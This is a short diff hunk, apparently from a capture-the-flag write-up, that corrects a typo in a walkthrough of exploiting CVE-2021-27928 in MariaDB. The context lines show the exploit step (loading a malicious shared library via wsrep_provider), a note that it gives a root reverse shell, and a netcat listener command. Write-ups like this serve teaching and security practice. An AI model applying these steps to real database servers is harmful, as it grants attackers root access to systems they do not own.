@@ -307,7 +307,7 @@ MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
 ERROR 2013 (HY000): Lost connection to MySQL server during query
 ```
 
-This results in a reverse shell on our listener as root and we can add the flag to our connection.
+This results in a reverse shell on our listener as root and we can add the flag to our collection.
 
 ```
 $ nc -lnvp 7575
